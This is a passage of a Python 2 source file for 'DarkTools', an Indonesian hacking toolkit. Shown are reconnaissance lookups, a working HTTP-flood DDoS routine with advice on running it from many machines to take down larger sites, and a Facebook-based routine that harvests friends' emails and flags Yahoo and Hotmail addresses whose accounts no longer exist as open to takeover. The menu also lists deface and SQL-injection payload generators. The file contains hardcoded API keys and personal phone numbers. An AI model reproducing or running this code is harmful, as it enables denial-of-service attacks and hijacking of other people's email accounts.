       yopie = urlopen(api).read()
       print W+" ["+g+"#"+W+"] Result   : \n"+yopie+""
    elif daffa == '7' or daffa == '07':
       print W+"\n ["+g+"#"+W+"] Reverse IP lookup of website"       
       zx = raw_input(W+" ["+g+"#"+W+"] Website  : ")
       trans = wongedan(zx)
       api = "http://api.hackertarget.com/reverseiplookup/?q=" + trans
       yopie = urlopen(api).read()
       print W+" ["+g+"#"+W+"] Result   : \n"+yopie+""
    elif daffa == '8' or daffa == '08':
       print W+"\n ["+g+"#"+W+"] Subnet lookup of website"       
       zx = raw_input(W+" ["+g+"#"+W+"] Website  : ")
       trans = wongedan(zx)
       api = 'http://api.hackertarget.com/subnetcalc/?q=' + trans
       yopie = urlopen(api).read()
       print W+" ["+g+"#"+W+"] Result   : \n"+yopie+""
    elif daffa == '9' or daffa == '09':
       print W+"\n ["+g+"#"+W+"] Whois lookup of website"       
       zx = raw_input(W+" ["+g+"#"+W+"] Website  : ")
       trans = wongedan(zx)
       api = 'http://api.hackertarget.com/whois/?q=' + trans
       yopie = urlopen(api).read()
       print W+" ["+g+"#"+W+"] Result   : \n"+yopie+""
    elif daffa == '10':
       print W+"\n ["+g+"#"+W+"] Zone transfer of website"       
       zx = raw_input(W+" ["+g+"#"+W+"] Website  : ")
       trans = wongedan(zx)
       api = 'http://api.hackertarget.com/zonetransfer/?q=' + trans
       yopie = urlopen(api).read()
       print W+" ["+g+"#"+W+"] Result   : \n"+yopie+""
 
#Subdomain
def sub(host):
		if host.startswith("www.http") or host.startswith("www.https") is True:
				host = host.replace("www.http","").split("://")[1]
		try:
				print w+"\n ["+g+"*"+w+"] Result :\n"
				res = urlopen("https://www.pagesinventory.com/search/?s=www.%s"%(host)).read();regx = re.findall('<td><a href=\"\/domain\/(.*?).html\">', res)
				if not regx:
					print w+" ["+r+" NOT FOUND "+w+"] Website not found";sleep(1)
				else:
					for foran in regx:
						print w+" ["+g+" FOUND "+w+"] " +foran
						sleep(1)
		except (URLError, HTTPError) as er:
				print w+"["+r+"!"+w+"] ERROR: " + str(er.reason);sleep(1)
		except KeyboardInterrupt:
				pass

#DDoS
def dos(host):
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    bot = []
    bot.append("http://www.ucshare.net/u4?channel=")
    bot.append("http://www.facebook.com/sharer/sharer.php?u=")
    bot.append("http://validator.w3.org/check?uri=")
    print g+"\n  *"+w+" This program will use HTTP FLOOD to dos the host."
    print g+"  * "+w+"It would work only on small websites if done only for one computer."
    print g+"  * "+w+"To take down larger websites run the attack from multiple computers."
    print g+"  * "+w+"For better performance open multiple instances of this software and attack at the same time.\n"
    print w+" ["+g+"#"+w+"] Host "+g+":"+w+" " + host
    ip = socket.gethostbyname(host)
    print w+" ["+g+"#"+w+"] IP   "+g+":"+w+" " + ip + "\n"
    print g+"  * "+w+"Depends on the site but should be more than 2000 or 3000 for average sites"
    conn = raw_input(w+" ["+g+"?"+w+"] Enter the number of packets to be sent : ") 
    silit = raw_input(w+" ["+g+"?"+w+"] Enter your message : ")
    conn = int(conn)
    print w+"\n ["+g+"#"+w+"] Please wait process FLODDING => [ %s ]" % (host)
    sleep(3)
    for i in range(1,conn):
        try:    
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.05)
        except socket.error:
            print w+" ["+r+"!"+w+"] ERROR SERVER DOWN"
            continue
        random_index = randrange(len(uagent));random_index2 = randrange(len(bot))
        try:
            s.connect((ip,80))
        except socket.error:
            print w+" ["+r+"!"+w+"] ERROR SERVER DOWN"
            continue
        print w+" ["+g+"*"+w+"] Sending packet !!! [%d]" % (i);s.send("GET / HTTP/1.1\r\n");s.send("Host: " + host + silit + "\r\n");s.send("User-Agent: " + uagent[random_index] + bot[random_index2] + "\r\n\r\n");s.close()

#Clone Yahoo
def cobra():
    reload(sys);
    sys.setdefaultencoding('utf8');
    br = mechanize.Browser();
    br.set_handle_robots(False);
    print w+"\n ["+g+"+"+w+"] Yahoo Clonning for Facebook "
    print w+"\n ["+g+"*"+w+"] Login your Facebook account"   
    idt = raw_input(w+" ["+g+"?"+w+"] Username/Email"+g+" : " + w);
    passw = raw_input(w+" ["+g+"?"+w+"] Password"+g+" : " + w)
    url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6";
    data = urllib.urlopen(url);
    op = json.load(data)
    if 'access_token' in op:
    	token = (op["access_token"]);
    	print w+" ["+g+"*"+w+"] Login successfull"
    else:
    	print w+" ["+r+"!"+w+"] Login failed coba cek connection kamu atau cek fb barangkali dapat security ganti sandi!"
    get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token);
    hasil = json.loads(get_friends.text);
    print (w+"\n ["+g+"#"+w+"] Managed to get your friend ID...")
    global putri, bella
    putri = []
    bella = 0
    print g + 57*"-";
    print g + "| " + 12*" " + k + "Email" + 14*" " + g + "|" + 9*" " + k + "Cek!" + 9*" " + g + "|";
    print g + 57*"-"
    for i in hasil['data']:
        wrna = "\033[32m";
        wrne = "\033[39m";
        bella += 1;
        putri.append(bella);
        x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token);
        y = json.loads(x.text)
        try:
            kunci = re.compile(r'@.*')
            cari = kunci.search(y['email']).group()
            if 'yahoo.com' in cari:
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com");
                br._factory.is_html = True;
                br.select_form(nr=0);
                br["username"] = y['email'];
                j = br.submit().read()
                Wong = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Wong.search(j).group()
                except:
                    vuln = 6*" " + m + "Not Vuln";
                    free = 30 - (len(y['email']));
                    pck = free * " ";
                    rizky = 24 - (len(vuln));
                    code = rizky * " ";
                    print g + "[ " + k + y['email'] + pck + g + "]-[ " + wrne + vuln + code + g + " ]"
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                	vuln = 8*" " + g + "Vuln"
                else:
                	vuln = 5*" " + m + "Not Vuln"
                	free = 30 - (len(y['email']));
                	pck = free * " ";
                	rizky = 24 - (len(vuln));
                	code = rizky * " ";
                	print g + "[ " + k + y['email'] + pck + g + "]-[ " + wrne + vuln + code + g + " ]"
            elif 'hotmail' in cari:
                url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + y['email'] + "&smtp=1&format=1");
                cek = json.loads(requests.get(url).text)
                if cek['smtp_check'] == 0:
                	vuln = 8*" " + g + "Vuln"
                else:
                	vuln = 5*" " + m + "Not Vuln"
                	free = 30 - (len(y['email']));
                	pck = free * " ";
                	rizky = 24 - (len(vuln));
                	code = rizky * " ";
                	print g + "[ " + g + y['email'] + pck + g + "]-[ " + wrne + vuln + code + g + " ]"
            else:
                pass
        except KeyError:
            pass

#info zodiak from tanggal lahir
def info():
	nama = raw_input(w+" ["+g+"+"+w+"] masukan nama > \033[96m")
	tanggal = raw_input(w+" ["+g+"+"+w+"] masukan tanggal lahir > \033[96m")
	api = "https://script.google.com/macros/exec?service=AKfycbw7gKzP-WYV2F5mc9RaR7yE3Ve1yN91Tjs91hp_jHSE02dSv9w&nama="+nama+"&tanggal="+tanggal
	url = Request(api)
	url2 = urlopen(url).read()
	decode = json.loads(url2)
	print (n+"\n result :")
	print (" -"*50)
	print (" => Status      : \033[96m%s"%decode["status"])
	print (" \033[0m=> nama        : \033[96m%s"%decode["data"]["nama"])
	print (" \033[0m=> lahir       : \033[96m%s"%str(decode["data"]["lahir"]))
	print (" \033[0m=> usia        : \033[96m%s"%str(decode["data"]["usia"]))
	print (" \033[0m=> ulang tahun : \033[96m%s"%str(decode["data"]["ultah"]))
	print (" \033[0m=> zodiak      : \033[96m%s"%str(decode["data"]["zodiak"]))
	print (" \033[0m-"*50)

#geo ip location
def geo():
	site = raw_input(w+" ["+g+"+"+w+"] masukan TARGET > \033[96m")
	cover = wongedan(site)
	api = "https://api.ipgeolocation.io/ipgeo?apiKey=e005253386624b8eb6f516156491b969&ip="+cover
	url = Request(api)
	url2 = urlopen(url).read()
	decode = json.loads(url2)
	print ("\n \033[96mresul\033[0m :")
	print (" -"*50)
	print (" : ip             : \033[96m%s"%str(decode["ip"]))
	print (" \033[0m: code benua     : \033[96m%s"%str(decode["continent_code"]))
	print (" \033[0m: nama benua     : \033[96m%s"%str(decode["continent_name"]))
	print (" \033[0m: code negara 2  : \033[96m%s"%str(decode["country_code2"]))
	print (" \033[0m: code negara 3  : \033[96m%s"%str(decode["country_code3"]))
	print (" \033[0m: nama negara    : \033[96m%s"%str(decode["country_name"]))
	print (" \033[0m: ibu kota negara: \033[96m%s"%str(decode["country_capital"]))
	print (" \033[0m: provinsi negara: \033[96m%s"%str(decode["state_prov"]))
	print (" \033[0m: district       : \033[96m%s"%str(decode["district"]))
	print (" \033[0m: kota           : \033[96m%s"%str(decode["city"]))
	print (" \033[0m: zipcode        : \033[96m%s"%str(decode["zipcode"]))
	print (" \033[0m: lintang        : \033[96m%s"%str(decode["latitude"]))
	print (" \033[0m: garis bujur    : \033[96m%s"%str(decode["longitude"]))
	print (" \033[0m: is_eu          : \033[96m%s"%int(decode["is_eu"]))
	print (" \033[0m: kode panggilan : \033[96m%s"%str(decode["calling_code"]))
	print (" \033[0m: domain negara  : \033[96m%s"%str(decode["country_tld"]))
	print (" \033[0m: bahasa         : \033[96m%s"%str(decode["languages"]))
	print (" \033[0m: bendera negara : \033[96m%s"%str(decode["country_flag"]))
	print (" \033[0m: isp            : \033[96m%s"%str(decode["isp"]))
	print (" \033[0m: jenis koneksi  : \033[96m%s"%str(decode["connection_type"]))
	print (" \033[0m: organisasi     : \033[96m%s"%str(decode["organization"]))
	print (" \033[0m: id geografis   : \033[96m%s"%str(decode["geoname_id"]))
	print (" \033[0m: kode           : \033[96m%s"%str(decode["currency"]["code"]))
	print (" \033[0m: mata uang      : \033[96m%s"%str(decode["currency"]["name"]))
	print (" \033[0m: simbol         : \033[96m%s"%str(decode["currency"]["symbol"]))
	print (" \033[0m: nama zona      : \033[96m%s"%str(decode["time_zone"]["name"]))
	print (" \033[0m: ngimbangin zona: \033[96m%s"%str(decode["time_zone"]["offset"]))
	print (" \033[0m: waktu saat ini : \033[96m%s"%str(decode["time_zone"]["current_time"]))
	print (" \033[0m: current unix   : \033[96m%s"%str(decode["time_zone"]["current_time_unix"]))
	print (" \033[0m: is_dst         : \033[96m%s"%int(decode["time_zone"]["is_dst"]))
	print (" \033[0m: hematan pertama: \033[96m%s"%int(decode["time_zone"]["dst_savings"]))
	print (" \033[0m-"*50)

#MemberZx
def zx() :
    print "\n   [*]  Official Member Of Zone Exploiter"
    print "\n | Zx-Kecil  | Zx-Vince      | Zx-Finix        | Kirana     |"
    print " | GeNeRaL   | Zx-Root@m3e.X | Zx-Marchia      | Zx-Sh4rk7  |"
    print " | Hankal    | Zx7           | Novita          | InfiNEX404 |"
    print " | Baba yaga | Wannabe ID    | Donikusuma      | igal       |"
    print " | Intan     | it's me       | polkop          | ricko v    |"
    print " | minion    | Zx-CR4R       | Tsujigirironin7 | Dfv47      |"
    print " | Mey       | Alfagans      | Ammy cans       | w0n63d4n   |"

#Help
def help():
    print w+"\n   Information for command of DarkTools"
    print g+"  -------------+---------------------------------------"
    print y+"   Command     "+g+"|"+y+"        Function fitur"
    print g+"  -------------+---------------------------------------"
    print w+"   ddos        "+g+": "+w+"Attacking DDoS for website"              
    print w+"   em_scrap    "+g+": "+w+"Scraping email in website"          
    print w+"   em_clone    "+g+": "+w+"Clonning email in facebook"              
    print w+"   scan_adfind "+g+": "+w+"Scanning page admin login in website"    
    print w+"   scan_header "+g+": "+w+"Scanning HTTP header in website"   
    print w+"   scan_port   "+g+": "+w+"Scanning port in website "
    print w+"   scan_sub    "+g+": "+w+"Scanning subdomain in website "  
    print w+"   scan_url    "+g+": "+w+"Scanning information url for hack"
    print w+"   scan_infoga "+g+": "+w+"Scanning information gathering url website"    
    print w+"   py_mar      "+g+": "+w+"Compile python script to marshal"       
    print w+"   hash_dnc    "+g+": "+w+"Dencrypt hash to text for password"    
    print w+"   hash_enc    "+g+": "+w+"Encrypt text to hash for password"    
    print w+"   cr_deface   "+g+": "+w+"Create script deface for easy"    
    print w+"   cr_dios     "+g+": "+w+"Create Dios for SQL Injection Manual"
    print w+"   zodiak      "+g+": "+w+"info zodiak tahun lahir and weton"
    print w+"   bug hunter  "+g+": "+w+"tools keperluan bug hunter"
    print w+"   ip location "+g+": "+w+"dump information in Ip web and Ip device"
    print w+"   update      "+g+": "+w+"update darktools for new fitur"
    print w+"   dt to sys   "+g+": "+w+"move darktools to System"
    print g+"  -------------+--------------------------------------"
    print w+"   help        "+g+": "+w+"Show the command of DarkTools"
    print w+"   about       "+g+": "+w+"About creator of DarkTools" 
    print w+"   zx_inf      "+g+": "+w+"Information of Zone Exploiter Team" 
    print w+"   clear       "+g+": "+w+"Clear program of DarkTools"        
    print w+"   exit        "+g+": "+w+"Exit program of DarkTools"

#bug hunter
def hunter():
    os.system('clear')
    banner()
    print w+" ["+g+"+"+w+"] mengumpulkan data bughunter..."
    sleep(2)
    buat = open('bughunter.sh','w')
    buat.write('git clone https://github.com/thehackingsage/bughunter.git && cd bughunter && chmod +x bughunter.py && cp bughunter.py /usr/bin/bughunter')
    buat.write('cd $HOME')
    buat.write('bughunter')
    sleep(1.5)
    os.system('clear')
    banner()
    print w+"\n ["+g+"+"+w+"] bughunter selesai di install"
    print w+" ["+g+"+"+w+"] jalankan dengan command sh bughunter.sh"
    print w+" ["+g+"+"+w+"] jika kalian buka termux/terminal pertama kali masukan perintah bughunter lalu enter\n"
    raise SystemExit()

#update darktools
def update():
    os.system('clear')
    banner()
    print w+"\n ["+g+"+"+w+"] proccess updating darktools waiting..."
    sleep(2)
    dt = open('update.sh','w')
    dt.write('cd $HOME')
    dt.write('rm -rf darktools')
    dt.write('git clone https://github.com/Zone-Xploiter/darktools')
    dt.write('sleep 2')
    dt.write('cd darktools && chmod +x darktools.py &&  python2 darktools.py')
    print w+"\n ["+g+"+"+w+"] mengumpulkan data update selesai!"
    print w+" ["+g+"+"+w+"] jalankan dengan command sh update.sh\n"
    raise SystemExit()

#move darktools to system
def dt():
    os.system('clear')
    banner()
    print w+"\n ["+g+"+"+w+"] proccessing data waiting..."
    buat = open('move.sh','w')
    buat.write('cd darktools && chmod +x darktools.py && cp darktools.py /usr/bin/darktools')
    buat.write('echo "moving finish"')
    buat.write('echo "cara menjalankannya jika kalian membuka termux/terminal"')
    buat.write('echo "hanya ketik darktools maka anda akan memasuki program dsrktools"')
    print w+"\n ["+g+"+"+w+"] mengumpulkan data selesai!"
    print w+" ["+g+"+"+w+"] masukan perintah sh move.sh\n"
    raise SystemExit()
    
def main():
    try:
        choice = raw_input(r+'\n ┌─'+b+'['+r+'DarkTools'+a+'@'+g+'Zone-Xploiter'+b+']'+r+'-'+b+'['+g+'Type The Command'+b+']\n '+r+'└─────'+y+'▶'+w+' # ')
        if choice == 'scan_adfind':  
            print w+"\n ["+g+"+"+w+"] Admin page login finder"
            wongedan = raw_input(w+" ["+g+"?"+w+"] Input website/host "+g+":"+w+" ")
            admin(wongedan)
            main()
        elif choice == 'zodiak':
            print w+"\n ["+g+"+"+w+"] masukan nama lengkap anda spaci ganti dengan + CONTOH: sugeng+hamdan"
            print w+" ["+g+"+"+w+"] masukan tanggal lahir dengan contoh 16-04-1996\n"
            info()
            main()
        elif choice == 'ip location':
            print w+"\n ["+g+"+"+w+"] masukan domain web tanpa http://"
            print w+" ["+g+"+"+w+"] atau masukan ip davice seseorang\n"
            geo()
            main()
        elif choice == 'about':
            print w+"\n ["+g+"+"+w+"] darktools adalah program pentesting,information gethering"
            print w+" ["+g+"+"+w+"] darktools awal mula dibuat oleh w0n63d4n dari(Zx) atau team Zone-Xploiter"
            print w+" ["+g+"+"+w+"] lalu dikembangkan oleh dvf47 dari team (BCC) atau Black Coder Crush"
            print w+" ["+g+"+"+w+"] dan terus akan dikembangkan sampai mencapai 20 fitur :)"
            print w+" ["+g+"+"+w+"] darktools bukan program yang berbahaya seperti menghapus file directori perangkat"
            print w+" ["+g+"+"+w+"] jika terdapat bug/error pada salah 1 fitur bisa hubungi kami"
            print w+" ["+g+"+"+w+"] w0n63d4n : on whatsapp > 08811664850"
            print w+" ["+g+"+"+w+"] dvf47    : on whatsapp > 082223108828"
            print w+" ["+g+"+"+w+"] cepat atau lambat kami akan merespon :)"
            print w+" ["+g+"+"+w+"] masukan,laporan and kritikan anda sangat membantu kami :)"
            main()
        elif choice == 'help':  
            help();main()
        elif choice == 'scan_port':  
            print w+"\n ["+g+"+"+w+"] Port scanning"
            wongedan = raw_input(w+" ["+g+"?"+w+"] Input website/host "+g+":"+w+" ")
            scanner(wongedan)
            main()
        elif choice == 'scan_header':  
        	print w+"\n ["+g+"+"+w+"] Http Header"
        	wongedan = raw_input(w+" ["+g+"?"+w+"] Input website/host "+g+":"+w+" ")
        	http(wongedan) 
        	main()   
        elif choice == 'scan_url':  
            print w+"\n ["+g+"+"+w+"] Http Header"
            wongedan = raw_input(w+" ["+g+"?"+w+"] Input website/host "+g+":"+w+" ")
            spider(wongedan)
            main()
        elif choice == 'cr_deface':  
            sc_deface()
            main()
        elif choice == 'update':
            update()
            main()
        elif choice == 'dt to sys':
            dt()
            main()
        elif choice == 'cr_dios':  
            dios_sc();
            main() 
        elif choice == 'py_mar':  
            py_mar()
            main() 
        elif choice == 'hash_enc':  
            hash_cr()
            main() 
        elif choice == 'hash_dnc':  
            hash_dnc()
            main() 
        elif choice == 'scan_infoga':  
            infoga()
            main() 
        elif choice == 'em_scrap':  
            print w+"\n ["+g+"+"+w+"] Email scraping in website"
            wongedan = raw_input(w+" ["+g+"?"+w+"] Input website/host "+g+":"+w+" ")
            email(wongedan) 
            main() 
        elif choice == 'scan_sub':  
            print w+"\n ["+g+"+"+w+"] Scanning subdomain in website"
            wongedan = raw_input(w+" ["+g+"?"+w+"] Input website/host "+g+":"+w+" ")
            sub(wongedan) 
            main() 
        elif choice == 'ddos':  
            print w+"\n ["+g+"+"+w+"] DDoS for website"
            wongedan = raw_input(w+" ["+g+"?"+w+"] Input website/host "+g+":"+w+" ")
            dos(wongedan) 
            main() 
        elif choice == 'em_clone':  
            cobra() 
            main()
        elif choice == 'bug hunter':
            hunter()
            main()
        elif choice == 'zx_inf':  
            zx() 
            main() 
        elif choice == 'exit':  
            exit() 
        elif choice == 'clear':  
            start() 
        else:
            if choice == '':
                    print "\n     "+br+"[!] command '"+choice+"' not found"+n+""
                    print '     '+br+'[!] type "help" to show command'+n+''
                    main() 
            else:
                    print "\n     "+br+"[!] command '"+choice+"' not found"+n+""
                    print '     '+br+'[!] type "help" to show command'+n+''
                    main()
    
    except Exception as e:
           print(e)
    except KeyboardInterrupt:
        print "\n\n      "+y+"("+r+" Ctrl + C "+y+")"+r+" Detected"+n+""
        print "       "+r+"["+y+"!"+r+"] "+y+"Program Exiting..."
        print "       "+r+"["+y+"!"+r+"] "+y+"Thanks For Using DfvXploit"
        
def start():
    os.system('clear')
    banner()
    main()
if __name__=='__main__':
    start()